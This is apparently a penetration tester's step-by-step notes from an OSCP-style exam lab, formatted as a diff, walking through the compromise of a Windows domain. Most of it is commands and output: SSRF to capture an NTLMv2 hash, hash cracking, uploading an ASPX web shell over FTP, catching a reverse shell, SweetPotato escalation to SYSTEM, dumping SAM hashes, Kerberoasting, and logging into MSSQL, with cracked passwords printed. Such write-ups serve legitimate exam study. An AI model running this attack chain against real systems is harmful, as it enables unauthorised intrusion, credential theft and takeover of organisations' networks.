@@ -1,0 +1,1326 @@
+┌──(kali㉿kali)-[~/oscpb]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.135.147                    
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 08:40 CET
+Nmap scan report for 192.168.135.147
+Host is up (0.038s latency).
+Not shown: 992 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
+|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
+|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+8000/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Microsoft-IIS/10.0
+8080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Bad Request
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Bad Request
+|_ssl-date: 2024-11-29T07:40:38+00:00; +3s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=MS01.oscp.exam
+| Subject Alternative Name: DNS:MS01.oscp.exam
+| Not valid before: 2022-11-11T07:04:43
+|_Not valid after:  2023-11-10T00:00:00
+|_http-server-header: Microsoft-HTTPAPI/2.0
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=11/29%OT=21%CT=1%CU=31936%PV=Y%DS=4%DC=T%G=Y%TM=674
+OS:96FF3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(
+OS:SP=104%GCD=1%ISR=10E%TI=I%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M
+OS:578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFF
+OS:F%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)
+OS:T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=
+OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
+OS:6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=1
+OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2s, deviation: 0s, median: 1s
+| smb2-time: 
+|   date: 2024-11-29T07:40:34
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   35.01 ms 192.168.45.1
+2   35.10 ms 192.168.45.254
+3   35.12 ms 192.168.251.1
+4   35.33 ms 192.168.135.147
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.03 seconds
+
+Port 8443 is using https traffic, therefore, I visited the site with
+
+https://ms01.oscp.exam:8443/
+
+Took me to a loging page that is vulnerable to SSRF 
+I used the url place holder to connect to the impacket smb server I started on my Kali. I typed in this into the url placeholder \\kaliip\share
+
+Then on my kali
+
+                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-smbserver share share -smb2support
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (192.168.135.147,55505)
+[*] AUTHENTICATE_MESSAGE (OSCP\web_svc,MS01)
+[*] User MS01\web_svc authenticated successfully
+[*] web_svc::OSCP:aaaaaaaaaaaaaaaa:bfd1e69873c72b1f68c73a8673c127f0:010100000000000000153d6d5342db010feb495e8a000888000000000100100045004800790063004200530069004b000300100045004800790063004200530069004b000200100064006700630059004c007000640053000400100064006700630059004c007000640053000700080000153d6d5342db0106000400020000000800300030000000000000000000000000300000fe5d504c831d09e971c2780dc7ed5359043fcd2c79c9474d8535d93f2fa1205a0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300033000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:share)
+[*] Closing down connection (192.168.135.147,55505)
+[*] Remaining connections []
+^CTraceback (most recent call
+
+
+#Cracked the hash
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ cat MS01   
+web_svc::OSCP:aaaaaaaaaaaaaaaa:bfd1e69873c72b1f68c73a8673c127f0:010100000000000000153d6d5342db010feb495e8a000888000000000100100045004800790063004200530069004b000300100045004800790063004200530069004b000200100064006700630059004c007000640053000400100064006700630059004c007000640053000700080000153d6d5342db0106000400020000000800300030000000000000000000000000300000fe5d504c831d09e971c2780dc7ed5359043fcd2c79c9474d8535d93f2fa1205a0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300033000000000000000000
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/oscpb]
+└─$ john -wordlist=/usr/share/wordlists/rockyou.txt MS01
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Diamond1         (web_svc)     
+1g 0:00:00:00 DONE (2024-11-29 12:45) 25.00g/s 614400p/s 614400c/s 614400C/s travon..280789
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+I accessed both the ftp and ssh services with both credentials
+
+──(kali㉿kali)-[~/oscpb]
+└─$ ftp 192.168.135.147                                                                         
+Connected to 192.168.135.147.
+220 Microsoft FTP Service
+Name (192.168.135.147:kali): web_svc
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||55509|)
+150 Opening ASCII mode data connection.
+11-13-22  11:17PM       <DIR>          aspnet_client
+11-10-22  03:53AM       <DIR>          custerr
+11-10-22  11:12PM       <DIR>          ftproot
+11-14-22  12:36AM       <DIR>          history
+11-10-22  11:16PM       <DIR>          logs
+11-13-22  11:17PM       <DIR>          pportal
+11-10-22  03:53AM       <DIR>          temp
+12-01-22  03:26AM       <DIR>          wwwroot
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ ssh web_svc@192.168.135.147 
+The authenticity of host '192.168.135.147 (192.168.135.147)' can't be established.
+ED25519 key fingerprint is SHA256:PMbZrT8kUg780yVuSoaF+1RVTe3iNvDE/DquCs74qWU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.135.147' (ED25519) to the list of known hosts.
+web_svc@192.168.135.147's password: 
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+                                               
+oscp\web_svc@MS01 C:\Users\web_svc>whoami      
+oscp\web_svc                       
+                                   
+oscp\web_svc@MS01 C:\Users\web_svc>hostname
+MS01                               
+                                   
+oscp\web_svc@MS01 C:\Users\web_svc>ls
+operable program or batch file.
+
+oscp\web_svc@MS01 C:\Users\web_svc>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3C99-887F
+
+ Directory of C:\Users\web_svc
+11/13/2022  11:23 PM    <DIR>          ..
+12/07/2019  01:14 AM    <DIR>          Desktop
+11/13/2022  11:23 PM    <DIR>          Documents
+12/07/2019  01:14 AM    <DIR>          Downloads
+12/07/2019  01:14 AM    <DIR>          Favorites
+12/07/2019  01:14 AM    <DIR>          Links
+12/07/2019  01:14 AM    <DIR>          Music
+12/07/2019  01:14 AM    <DIR>          Pictures
+12/07/2019  01:14 AM    <DIR>          Saved Games
+12/07/2019  01:14 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              11 Dir(s)  10,306,883,584 bytes free
+
+oscp\web_svc@MS01 C:\Users\web_svc>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+----------- ----               ---------------
+User        MS01\Administrator Local
+Group       OSCP\Domain Admins ActiveDirectory
+
+
+PS C:\Users\web_svc> cd ..
+PS C:
+#Fpr ssh, I only had access as uprivilege user and no attack vector to escalate my privilege
+
+#Through the ftm server, I navigated to the wwwroot and and uploaded a windows webshell to access throught the browser.
+┌──(kali㉿kali)-[/usr/share/webshells/aspx]
+└─$ ls
+cmdasp.aspx
+                                                                                     
+┌──(kali㉿kali)-[/usr/share/webshells/aspx]
+└─$ cp cmdasp.aspx /home/kali/oscpb 
+
+ftp> cd wwwroot
+250 CWD command successful.
+ftp> put cmdasp.aspx
+local: cmdasp.aspx remote: cmdasp.aspx
+229 Entering Extended Passive Mode (|||55600|)
+125 Data connection already open; Transfer starting.
+100% |****************************************|  1442       17.62 MiB/s    --:-- ETA
+226 Transfer complete.
+1442 bytes sent in 00:00 (20.03 KiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||55601|)
+150 Opening ASCII mode data connection.
+11-29-24  06:30AM                 1442 cmdasp.aspx
+11-10-22  03:53AM                  696 iisstart.htm
+11-10-22  03:53AM                98757 iisstart.png
+
+Accessed via the web browser with this url
+http://ms01.oscp.exam:8000/cmdasp.aspx (Note that port 8000 has the web root)
+
+It opened a commandline interface where I typed in a powershell oneline command and caught a reverse shell as an IIS user
+──(kali㉿kali)-[~/oscpb]
+└─$ nc -nvlp 4443
+listening on [any] 4443 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.135.147] 55602
+whoami
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv> hostname
+MS01
+PS C:\windows\system32\inetsrv> whoami \priv
+PS C:\windows\system32\inetsrv> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone 
+
+The user have seeimpersonation privelege which I exploited to get nt-authority privilege
+
+
+PS C:\users\public> .\SweetPotato.exe -p met.exe
+
+──(kali㉿kali)-[~/oscpa]
+└─$ nc -nvlp 443 
+listening on [any] 443 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.135.147] 55615
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+Futher enumeration with Powerview to understand the domain
+
+import-module .\PowerView.ps1
+PS C:\users\administrator> Get-NetDomain
+Get-NetDomain
+
+
+Forest                  : oscp.exam
+DomainControllers       : {DC01.oscp.exam}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : 
+PdcRoleOwner            : DC01.oscp.exam
+RidRoleOwner            : DC01.oscp.exam
+InfrastructureRoleOwner : DC01.oscp.exam
+Name                    : oscp.exam
+
+
+
+PS C:\users\administrator> ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.135.147
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.135.254
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.95.147
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+PS C:\users\administrator> Get-NetUser | select displayname,userprincipalname                    
+Get-NetUser | select displayname,userprincipalnameGet-NetUser | select displayname,userprincipalname                    
+
+displayname     userprincipalname        
+-----------     -----------------        
+                                         
+                                         
+                                         
+Celia Almeda    celia.almeda@oscp.exam   
+Tom Kinney      tom.kinney@oscp.exam     
+Tom Admin       tom_admin@oscp.exam      
+Leonard Morris  Leonard.Morris@oscp.exam 
+Sandra Craig    Sandra.Craig@oscp.exam   
+Chelsea Byrne   Chelsea.Byrne@oscp.exam  
+Luke Martin     Luke.Martin@oscp.exam    
+Donna Johnson   Donna.Johnson@oscp.exam  
+Lawrence Kay    Lawrence.Kay@oscp.exam   
+Emily Bishop    Emily.Bishop@oscp.exam   
+Linda Patel     Linda.Patel@oscp.exam    
+Jamie Thomas    Jamie.Thomas@oscp.exam   
+Shane Mitchell  Shane.Mitchell@oscp.exam 
+Frank Farrell   Frank.Farrell@oscp.exam  
+Jane Booth      Jane.Booth@oscp.exam     
+Joan North      Joan.North@oscp.exam     
+Carol Webb      Carol.Webb@oscp.exam     
+Kenneth Coles   Kenneth.Coles@oscp.exam  
+Oliver Gray     Oliver.Gray@oscp.exam    
+Georgina Begum  Georgina.Begum@oscp.exam 
+Aimee Hunt      Aimee.Hunt@oscp.exam     
+Thomas Robinson Thomas.Robinson@oscp.exam
+Janice Turner   Janice.Turner@oscp.exam  
+sql_svc         sql_svc@oscp.exam        
+John Dorian     john.dorian@oscp.exam    
+web_svc         web_svc@oscp.exam 
+
+Sharphound and bloodhound also revealed that tom_admin is a member of the domain admin.
+
+With my Nt-Authority sytem privilege, I dumped the sam and system file to know users that have session in the computer
+
+PS C:\Users\Administrator> reg save hklm\sam c:\sam
+reg save hklm\sam c:\sam
+The operation completed successfully.
+PS C:\Users\Administrator> reg save hklm\system c:\system
+reg save hklm\system c:\system
+The operation completed successfully.
+PS C:\Users\Administrator> cd ..
+cd ..
+
+──(kali㉿kali)-[~/oscpb]
+└─$ sudo impacket-secretsdump -sam sam -system system LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+[*] Cleaning up... 
+            
+Cracked with this website https://ntlm.pw/
+
+3c4495bbd678fac8c9d218be4f2bbc7b December31
+9a3121977ee93af56ebd0ef4f527a35e [not found] This is for Mary.Williams
+d9358122015c5b159574a88b3c0d2071 Freedom1
+
+For Pivoting, because of the limitations of chisel, I decided to start using Ligolo
+See tutorial documentation.
+
+After setting up my ligolo client and server
+I started with kebroasting, since I could not find any vector in MS01. With the web_svc credential I have, I keberoasted the DC because I saw in bloohound that the account sql_svc is keberoastable.
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ impacket-GetUserSPNs -request -dc-ip 10.10.133.146 oscp.exam/web_svc
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------  --------  --------------------------  --------------------------  ----------
+MSSQL/MS02.oscp.exam  sql_svc            2022-11-10 09:03:18.456165  2024-11-30 20:28:24.697590             
+HTTP/MS01.oscp.exam   web_svc            2022-11-11 08:11:19.795439  2024-11-30 12:32:28.447591             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$75a72d259a948f9df78d6387f2219a25$66b3f1693633a313f998e0b59d20be72a12f8dbd9e972b506be9295d23a6e579568632adf50f5f517f246b8756531a8b8f9ccfda34f1ac51bb5ac3e4456a176cc26465ae3b953c9b3f4c8742811d5e089cf1517ec1f2dc690cce33624c47dbfe7523dc0035c2c2075d65ec764cf0cf27751c3057a085362652cfe89ced7dcb96ad7cb4b360f95fd9345d2afff02db25dd7b48404d795526f8423791b85b066eb451297f58fdafcf85cc4f4d7975e722b0e879ef71fda047626755dd4ed85bb4530869dc538017f31114df6cd4cc6a113794631b84263b283cd1cb17c96c0a356c6724994c9b50e4887b56115502a17f4c2ee3e8e69087df9f87a90814edbceb1632309691fd43e231cb676fa51dca14bf090dcab4bc2fab4dcda370c4e2297af5e9dd9ff866a4768704a7ad1c6f8a918c5f975848eead81062e7d626cbd82395f5f6fd15c0676877c083ca8e1110009eaf3546d3458b018f0e05effc0a712de741912279687f4a6fa877f570b9570d104b96da5f7ba7cd987d67860613ab7d38f03e6c5ae5e51844bbd09a0813a5464714364097f9498ad4f64213d3ede7b3d13e352e3bb34654e2e248abdd2085e6a56571d2e1c1c60ca431878a754ba24ed277b3aabf4aa9b725ee074bbe3fdcbfee4103a45fd7d1888ac4c128bd5a6bf2e8093ca2c00cd9086aa5136b28405cfab4631742c02d4506c748a1d91fc601843e57be86dc4e286647b3c1111ebbe053da2cb9a5acc9bfc9e5f8f4b402e136df8adfac1b24b4d93370bc5e2981d1582714e779be8f57e06286ea715c0dd2532bec844d0ed39ebd5e100566e112ce6642f388b8073ffac5f8a633270678e2f6c24a430a173409027678dcb41c35f1adfad79864c8dd68162a287e04f6b5dcda61aa7bff6b5846abc7aaa0fce9a9d8a6c21f9b719270782ffc37f88f7a7a08abcd416e715f3770b446be616e2e67030c685cbbc4a16c5fdacb945a1e279dddca263dbb0602f09402d8d4ed432ba38d082cbd52e179aca30af14b4926302debe79055467ce8e20a5e6d131b0bc2f1bdfca02cbfd0bf0f5ab402409d349fc0a38914b963258aeea7e94251babd210358c056ec0f9676e4b17123250e3e4366386dfcf9d1c3233c35b35d961a2f3889dccb62ab31fc76b7bb97b84923d00db8a7ed78ec4c58665d7583a6fbd37e3c5f9e9a57e2ba6560a8cf40460f75be9bd122b828a63502105fdf9abefd867aa603d52b796d8c4fe03211f58755b83107748fad3ecac45e245b0fda532b906b33b5b7a7af09ff4fe3d4a450e4e0379a88471766bc18dda248fb91e755721636fa0a19d382b69320133469259f628b4909a96cc9b5151ab156ea611c482ea99207047c2769198a0fcca818218178acbd85bd52bf47d451
+
+Found the kebero's hash for sql_svc. Notice I dont use prochain again
+
+#Cracking
+
+──(kali㉿kali)-[~/oscpb]
+└─$  sudo hashcat -m 13100 hashes.keb /usr/share/wordlists/rockyou.txt --force
+[sudo] password for kali: 
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-penryn-AMD Ryzen 9 6900HS Creator Edition, 4987/10038 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$d4560bc9242a2f8f787b01992041e989$5602cc2ac64f721d30ab91d852c49dd25646c30cd5bf5e9382a6799af980fe423d8d61b56d239c180184072e4ad24cfbe9099640675e9cabd61dd4bafb66eda31218b3dbcca62e7c39ea05bb206527bd23a4f63f40d0ede749511cd933173a195ec2b8a0b4c588ab4800f403f92e000a223dada09d43b768d1d0c1be7e44e05e44b143146fd87b50d7902cba3de3dc2fd6687b098447f3bd67462d0c5aed541c294ca1519efa8acc4dc55950be3b7ff46dba5f24c114aecefcafc8c661309cffb547c88d7a207e6b595f12f723d40ff620306ab3f4ee45ce5fa6aec5c50a27f28aa6b30f41706c7b3558a35b17fb535ef9589a2d9b239f68581b45bb38af055024935055109953a36758ea1563c9449a0d386e94a742a89f6760e15c0cf7b0850475dbcf1402f4d379c88a422c41e35c5305e4f3769475e7b733a8f6d858ac53bf4e8d2b9684c4da8f321fd2f5047bd6fb14c490745078a38eaabc9da6c708159be89a102b33636ca0a64834bfb5982fbef33b96adfadaf39d49f81b7d06582dee4966cdae2901465f489d9cf6caad137f311e2099ccab218d3e1a612536b32f9dad26d0688227dd33e38c903360b0c9771729f75008ae14dbe887616eb615d27f7f904eceb7ccb25dbe53a9a335364c5b17432ec8eace49edbfeca9e7a191654d3dc48fbf2ae4cbc507f5962e353cdade0d16a65ff1da791fab8732a0586c0aabd06bedab16ad06a140632c833d4db27e19a1698a93272ad76ab41aca25a01b95d42b9281a4576e46c84dc649625880d7289f3e6821bed03082c9f8beef84dd1e7b220f600a830475642d54b3eb7b80ed0669869513d8045dce8a0c92d2944c83d66399e8b88ba9aea79844ea33f011962026d4dd96ddc219ff94a0abdaf6ee833b4f34d7aaf6a51dbdbbdc7f86e3899b87fea2b931443a2b89fd70d5f7a7499b650649b15d0040b09384ba9eee76ec1f201308cf54488baf5d8893d00e394b17380e749f923fc899651aa7efeb1c9f5698f648ddbed04cb40a7e4361e232a40e9d7345ac179dc61eb6c997e0c5370d9544e7fdf8062e9bd05996cd222ae498d988d91c8022626ef69a35ad4ea509d14fdcbe4550c121a393188d5f707a2edc142177bd4beb52133f47731c32bc3f18a4304a3af54b64ec7b903cd9ed272bde0cb82f0b0609e9cf7efad82981e9eccb39540426ede470db4c6fa2a5df443d3a041e04863f8b3b3c9634948985c4eb3b5008db1e9a5569177fbbaace6cbf08614061940ad1abf4ed5b68035df6ce3a16aeb82e6089d8181dc45b472b808a91c5f8fa4e4d68d74be127956db38b103b6764b992549c3bdf5daaab61b730271e8a6a7e3e6d14bfecdcdb045a4545dd87d5fd06e694d58e4b4bb9553f03b7a6d1e482:Dolphin1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: hashes.keb
+Time.Started.....: Sat Nov 30 11:39:53 2024, (1 sec)
+Time.Estimated...: Sat Nov 30 11:39:54 2024, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   935.6 kH/s (2.14ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
+Progress.........: 106496/28688770 (0.37%)
+Rejected.........: 0/106496 (0.00%)
+Restore.Point....: 49152/14344385 (0.34%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: truckin -> spook
+Hardware.Mon.#1..: Util: 31%
+
+Started: Sat Nov 30 11:39:50 2024
+Stopped: Sat Nov 30 11:39:55 2024
+
+I used it to acess the sql server in MS02
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$impacket-mssqlclient sql_svc:Dolphin1@10.10.133.148 -windows-auth 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (OSCP\sql_svc  dbo@master)> SELECT @@version;
+                                                                                                                                                                                                             
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows 10 Pro 10.0 <X64> (Build 19042: ) (Hypervisor)
+   
+
+SQL (OSCP\sql_svc  dbo@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    show_query                 - show query
+    mask_query                 - mask query
+    
+SQL (OSCP\sql_svc  dbo@master)> enum_users
+UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID   
+---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------   
+##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'0106000000000009010000004c1967c27feb2ead332894c5a0779eae202847c8'   
+
+##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'5681cce7a1f1ff41b2f95ced7d792e70'   
+
+dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'   
+
+guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'   
+
+INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL   
+
+sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL   
+
+SQL (OSCP\sql_svc  dbo@master)> enum_db
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+
+tempdb                   0   
+
+model                    0   
+
+msdb                     1   
+
+SQL (OSCP\sql_svc  dbo@master)> use masterSELECT * FROM master.information_schema.tables;
+ERROR(MS02\SQLEXPRESS): Line 1: Database 'masterSELECT' does not exist. Make sure that the name is entered correctly.
+SQL (OSCP\sql_svc  dbo@master)> SELECT * FROM msdb.information_schema.tables;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME                                                  TABLE_TYPE   
+-------------   ------------   ---------------------------------------------------------   ----------   
+msdb            dbo            syspolicy_policy_category_subscriptions                     b'VIEW'      
+
+msdb            dbo            sysnotifications                                            b'BASE TABLE'   
+
+msdb            dbo            sysutility_ucp_snapshot_partitions_internal                 b'BASE TABLE'   
+
+msdb            dbo            systaskids                                                  b'BASE TABLE'   
+
+msdb            dbo            syscachedcredentials                                        b'BASE TABLE'   
+
+msdb            dbo            syscollector_blobs_internal                                 b'BASE TABLE'   
+
+
+SQL (OSCP\sql_svc  dbo@master)> SELECT * FROM msdb.dbo.syscachedcredentials
+login_name   has_server_access   is_sysadmin_member   cachedate   
+----------   -----------------   ------------------   ---------   
+SQL (OSCP\sql_svc  dbo@master)> SELECT * FROM msdb.dbo.backupfile
